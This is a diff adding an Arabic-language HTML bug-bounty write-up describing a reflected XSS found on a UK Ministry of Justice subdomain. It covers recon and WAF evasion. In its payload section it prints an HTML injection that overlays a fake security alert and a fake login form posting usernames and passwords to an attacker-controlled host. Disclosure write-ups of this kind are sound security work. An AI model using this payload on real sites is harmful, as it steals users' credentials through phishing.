@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اكتشاف ثغرة XSS في وزارة العدل البريطانية</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a14;
+            --primary-color: #00F0FF;
+            --secondary-color: #ffffff;
+            --container-bg: rgba(20, 28, 46, 0.6);
+            --border-color: rgba(0, 240, 255, 0.3);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--secondary-color);
+            line-height: 1.8;
+            overflow-x: hidden;
+            /* New: Added position relative and overflow hidden for the new background effect */
+            position: relative; 
+        }
+        
+        /* --- New: Animated Gradient Mesh Background --- */
+        .gradient-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -1;
+        }
+
+        .blob {
+            position: absolute;
+            border-radius: 50%;
+            background: var(--primary-color);
+            opacity: 0.1;
+            filter: blur(100px);
+            animation: move 25s infinite alternate;
+        }
+
+        .blob:nth-child(1) {
+            width: 500px;
+            height: 500px;
+            top: -150px;
+            left: -200px;
+            animation-duration: 20s;
+        }
+
+        .blob:nth-child(2) {
+            width: 400px;
+            height: 400px;
+            bottom: -100px;
+            right: -150px;
+            animation-duration: 30s;
+            animation-delay: 3s;
+        }
+        
+        .blob:nth-child(3) {
+            width: 300px;
+            height: 300px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation-duration: 18s;
+        }
+
+        @keyframes move {
+            0% {
+                transform: translate(0, 0) scale(1);
+            }
+            50% {
+                transform: translate(150px, -50px) scale(1.2);
+            }
+            100% {
+                transform: translate(-100px, 100px) scale(0.9);
+            }
+        }
+        
+        /* Removed #particles-js styles */
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+            z-index: 2;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 4rem;
+            padding: 2rem 0;
+        }
+
+        .main-title {
+            font-size: 2.8rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            /* New: Replaced text-shadow with an animated gradient for a shimmer effect */
+            background: linear-gradient(90deg, var(--secondary-color), var(--primary-color), var(--secondary-color));
+            background-size: 200% auto;
+            color: #fff;
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            opacity: 0;
+            animation: fadeInUp 1s ease-out forwards, shimmer 3s linear infinite 1s; /* Added shimmer animation */
+        }
+        
+        /* New: Style for discoverer's name */
+        .discoverer {
+            font-size: 1.2rem;
+            margin-top: 1rem;
+            color: var(--secondary-color);
+            opacity: 0;
+            animation: fadeInUp 1s ease-out 0.5s forwards;
+        }
+
+        /* --- New: Fade In Up Animation --- */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* New: Shimmer animation for the main title */
+        @keyframes shimmer {
+            to {
+                background-position: -200% center;
+            }
+        }
+        
+        /* Removed typing and blink-caret animations */
+
+        .story-section {
+            background: var(--container-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 15px;
+            padding: 2.5rem;
+            margin-bottom: 2rem;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            /* New: Smoother transition effect */
+            transition: transform 0.6s cubic-bezier(0.165, 0.84, 0.44, 1), opacity 0.6s ease-out;
+            opacity: 0;
+            transform: translateY(50px);
+        }
+        
+        .story-section.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .story-section h2 {
+            font-size: 1.8rem;
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .story-section p {
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+        }
+
+        .poc-image-container {
+            margin: 2rem 0;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 2px solid var(--border-color);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.2);
+        }
+
+        .poc-image-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .payload-code {
+            background-color: #0d1117;
+            border: 1px solid var(--border-color);
+            color: #c9d1d9;
+            padding: 1rem 1.5rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            direction: ltr; /* الكود يكتب من اليسار لليمين */
+            text-align: left;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1.1rem;
+            margin-top: 1.5rem;
+        }
+        
+        .payload-code span {
+            color: #79c0ff;
+        }
+
+        footer {
+            text-align: center;
+            padding: 2rem;
+            color: #888;
+            font-size: 0.9rem;
+        }
+
+        /* --- تصميم متجاوب مع الشاشات الصغيرة --- */
+        @media (max-width: 768px) {
+            .main-title {
+                font-size: 1.8rem;
+                /* Removed animation:none from here as the new animation works well */
+            }
+            .story-section {
+                padding: 1.5rem;
+            }
+            .story-section h2 {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- New: Gradient Background Blobs -->
+    <div class="gradient-bg">
+        <div class="blob"></div>
+        <div class="blob"></div>
+        <div class="blob"></div>
+    </div>
+
+    <div class="container">
+        <header>
+            <h1 class="main-title">اكتشاف ثغرة Reflected XSS</h1>
+            <!-- New: Discoverer's name added -->
+            <p class="discoverer">اكتشاف بواسطة: علي خالد</p>
+        </header>
+
+        <main>
+            <section class="story-section">
+                <h2>1. تحديد الهدف ومرحلة الاستطلاع (Recon)</h2>
+                <p>
+                    أول شيء أسوي كباحث عن الثغرات أحدد الهدف، وهاي المره كان الهدف هو وزارة العدل البريطانية. هنا ندخل في مرحلة الريكون، نبحث عن الـ subdomains الخاصة بالهدف.
+                </p>
+                <p>
+                    أنا أفضل بداية الفحص تكون بالمواقع الفرعية للموقع الرئيسي والهدف من هذا الشيء هو الحماية السيئة الي تكون بيها، ما يتم وضع حماية بقوة حماية الـ main domain.
+                </p>
+            </section>
+
+            <section class="story-section">
+                <h2>2. نقطة الدخول والاكتشاف الأولي</h2>
+                <p>
+                    في أحد النطاقات الفرعية لوزارة العدل البريطانية وخل نفترض اسمها <code>target.justice.gov.uk</code> لكيت خانة بحث، هذا هو المكان المتوقع وجود ثغرات الـ xss بي.
+                </p>
+                <p>
+                    مثل اي باحث عادي قررت أجرب البحث و اشوف النتيجة بالسورس كود وكذالك بالرابط، وهنا جانت المفاجاة الموقع ما يشفر المدخلات! لكن واضع الية بسيطة بتحويل كل المدخلات الى نص وهذا من اسهل الاشياء بالتخطي.
+                </p>
+            </section>
+
+            <section class="story-section">
+                <h2>3. بناء وتجربة الحمولة (Payload)</h2>
+                <p>
+                    فعلاً شفت الكلمات الي ما يتم مسحها او حظرها بواسطة الـ WAF الى ان وصلت الى هذا البايلود:
+                </p>
+                <div class="payload-code">
+<span>('</span>""><div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;z-index:9999;padding:10px;font-weight:bold">تنبيه أمني لإعادة التحميل <a href="https://attacker-controlled.com/fake-update" style="color:yellow;text-decoration:underline">[إصلاح]</a></div><form action="https://attacker-controlled.com/steal" method="POST" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border:2px solid red;z-index:10000"><h3>الرجاء إعادة تسجيل الدخول</h3><label>اسم المستخدم:<br><input name="username" required style="width:100%;margin:5px 0"></label><label>كلمة المرور:<br><input name="password" type="password" required style="width:100%;margin:5px 0"></label><input type="submit" value="تأكيد الهوية" style="background:blue;color:white;padding:8px 15px;margin-top:10px;cursor:pointer"></form><span>)</span>
+                </div>
+                <p>
+                    مثل ما تشوفون ببداية البايلود اكو <code>(')</code> وضيفتها تسد النص الاصلي حتى باقي الكود ما ينعكس بكنص!! لا ينعكس ككائن. وهنا كانت الفرحة الكود نجح 😁😁 وهاي كانت ثاني ثغرة XSS تنقبل عندي.
+                </p>
+                <div class="poc-image-container">
+                    <!-- 
+                        ملاحظة: الرابط الذي أرسلته لا يعمل.
+                        لقد وضعت صورة مؤقتة هنا.
+                        الرجاء استبدال 'src' بالرابط الصحيح للصورة.
+                    -->
+                    <img src="https://d2b6stxjw39da8.cloudfront.net/8pcy1%2Fpreview%2F70635049%2Fmain_large.jpg?response-content-disposition=inline%3Bfilename%3D%22main_large.jpg%22%3B&response-content-type=&Expires=1757239212&Signature=BKyLx9EXalm4PSTUmXbfoBbq--lVs3ysfXZoNLRsy~SdnpBj7qYJZZ2pHyOIIkXvIjoDN1NtZXPk20Ln5RGP9WoFVLxNPMLnlOUrDbWTFfRFTiWMqNjIJBGWFIslM0kAzepvm1aaYdsQxnzHgGqEBaVaSljSk0H7jFDYoX6NCN1AyXcTy2GfPCuadJQyQ-Y4dpEyklM6~b~8F4bRsg9Zjgcmy1faLP28FB7DwX9RxidLUMAuk6A~xr0bF10GHDkYIVI2T2kcXD-TCcprzi2Oq-lP7FLZiJCeCcBUxWVFVZ86-FSjaR5k3CoSiQTuQ1rZUYMdZhR43zl0lV1WbM7bUA__&Key-Pair-Id=APKAJT5WQLLEOADKLHBQ" alt="Proof of Concept for XSS">
+                </div>
+                <p>
+                    
+                </p>
+            </section>
+        </main>
+        
+        <footer>
+            <p>&copy; 2025 علي خالد. جميع الحقوق محفوظة. تم إعداد هذا التقرير الفني لعرض تفاصيل الاكتشاف.</p>
+        </footer>
+    </div>
+
+    <script>
+        // --- جافاسكريبت لحركة ظهور العناصر عند التمرير ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const sections = document.querySelectorAll('.story-section');
+            
+            const observer = new IntersectionObserver(entries => {
+                entries.forEach((entry, index) => {
+                    if (entry.isIntersecting) {
+                        // إضافة تأخير بسيط لكل عنصر لظهور متتابع
+                        setTimeout(() => {
+                            entry.target.classList.add('visible');
+                        }, index * 150);
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, {
+                threshold: 0.1 // يظهر العنصر عند رؤية 10% منه
+            });
+
+            sections.forEach(section => {
+                observer.observe(section);
+            });
+
+            // --- Removed the particle generation script ---
+        });
+
+    </script>
+</body>
+</html>
+
+
+
